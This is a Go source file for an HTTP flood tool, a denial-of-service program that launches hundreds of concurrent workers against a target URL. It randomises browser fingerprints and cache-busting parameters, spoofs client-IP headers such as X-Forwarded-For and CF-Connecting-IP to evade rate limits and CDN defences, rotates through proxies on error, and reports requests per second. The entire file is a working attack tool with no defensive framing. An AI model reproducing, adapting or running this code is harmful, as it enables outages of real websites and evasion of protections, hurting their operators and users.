package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	targetURL   string
	threads     int
	duration    int
	method      string
	proxyFile   string
	headerFile  string
	http3       bool
	pipelining  int
	requests    int64
	errors      int64
	startTime   time.Time
)

var (
	userAgents = []string{
		// Chrome 2025-2026
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		// Firefox
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
		// Safari
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
		// Edge
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
		// Mobile
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"*/*",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.google.com/search?q=",
		"https://www.bing.com/search?q=",
		"https://duckduckgo.com/?q=",
		"https://www.youtube.com/",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.reddit.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
		"https://news.ycombinator.com/",
		"https://github.com/",
	}

	languages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-US,en;q=0.9,id;q=0.8",
		"id-ID,id;q=0.9,en;q=0.8",
		"en-US,en;q=0.5",
	}
)

func randString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(223)+1, rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func buildHeaders(req *http.Request) {
	ua := userAgents[rand.Intn(len(userAgents))]
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
	req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-Ch-Ua", `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`)
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)

	// Cache bust + referer
	ref := referers[rand.Intn(len(referers))]
	if strings.Contains(ref, "q=") {
		ref += randString(8)
	}
	req.Header.Set("Referer", ref)

	// Spoofed headers
	req.Header.Set("X-Forwarded-For", randomIP())
	req.Header.Set("X-Real-IP", randomIP())
	req.Header.Set("X-Client-IP", randomIP())
	req.Header.Set("CF-Connecting-IP", randomIP())
	req.Header.Set("True-Client-IP", randomIP())
}

func loadProxies(path string) []string {
	if path == "" {
		return nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var list []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func createClient(proxy string) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			NextProtos:         []string{"h2", "http/1.1"},
		},
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 1000,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	http2.ConfigureTransport(transport)

	if proxy != "" {
		proxyURL, err := url.Parse(proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	return &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func floodWorker(ctx context.Context, wg *sync.WaitGroup, proxies []string) {
	defer wg.Done()

	var client *http.Client
	proxyIdx := 0
	if len(proxies) > 0 {
		client = createClient(proxies[rand.Intn(len(proxies))])
	} else {
		client = createClient("")
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Build randomized URL
			u, _ := url.Parse(targetURL)
			q := u.Query()
			q.Set("_", strconv.FormatInt(time.Now().UnixNano(), 10))
			q.Set("r", randString(12))
			u.RawQuery = q.Encode()

			req, err := http.NewRequestWithContext(ctx, method, u.String(), nil)
			if err != nil {
				atomic.AddInt64(&errors, 1)
				continue
			}

			buildHeaders(req)

			// Optional body for POST
			if method == "POST" {
				body := strings.NewReader("data=" + randString(32) + "&token=" + randString(16))
				req.Body = io.NopCloser(body)
				req.ContentLength = int64(body.Len())
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			}

			resp, err := client.Do(req)
			if err != nil {
				atomic.AddInt64(&errors, 1)
				// rotate proxy on error
				if len(proxies) > 0 {
					proxyIdx = (proxyIdx + 1) % len(proxies)
					client = createClient(proxies[proxyIdx])
				}
				continue
			}
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			atomic.AddInt64(&requests, 1)
		}
	}
}

func stats(ctx context.Context) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			r := atomic.LoadInt64(&requests)
			e := atomic.LoadInt64(&errors)
			elapsed := time.Since(startTime).Seconds()
			rps := float64(r) / elapsed
			fmt.Printf("\r[+] Sent: %d | Errors: %d | RPS: %.0f | Elapsed: %.0fs", r, e, rps, elapsed)
		}
	}
}

func main() {
	flag.StringVar(&targetURL, "url", "", "Target URL (required)")
	flag.IntVar(&threads, "t", 500, "Number of concurrent workers")
	flag.IntVar(&duration, "d", 60, "Duration in seconds")
	flag.StringVar(&method, "m", "GET", "HTTP method (GET/POST)")
	flag.StringVar(&proxyFile, "proxy", "", "Proxy list file (optional)")
	flag.StringVar(&headerFile, "headers", "", "Custom headers file (optional)")
	flag.BoolVar(&http3, "http3", false, "Enable HTTP/3 (experimental)")
	flag.IntVar(&pipelining, "pipe", 1, "Requests per connection (pipelining)")
	flag.Parse()

	if targetURL == "" {
		fmt.Println("Usage: ./flood -url https://target.com -t 1000 -d 120 -m GET -proxy proxies.txt")
		fmt.Println("Options:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	method = strings.ToUpper(method)
	if method != "GET" && method != "POST" {
		fmt.Println("Method must be GET or POST")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())

	proxies := loadProxies(proxyFile)
	if len(proxies) > 0 {
		fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
	}

	fmt.Printf("[+] Target   : %s\n", targetURL)
	fmt.Printf("[+] Threads  : %d\n", threads)
	fmt.Printf("[+] Duration : %d seconds\n", duration)
	fmt.Printf("[+] Method   : %s\n", method)
	fmt.Println("[+] Starting flood...")

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Handle Ctrl+C
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n[!] Stopping...")
		cancel()
	}()

	startTime = time.Now()
	var wg sync.WaitGroup

	go stats(ctx)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go floodWorker(ctx, &wg, proxies)
	}

	wg.Wait()
	fmt.Printf("\n[+] Finished. Total requests: %d | Errors: %d\n",
		atomic.LoadInt64(&requests), atomic.LoadInt64(&errors))
}
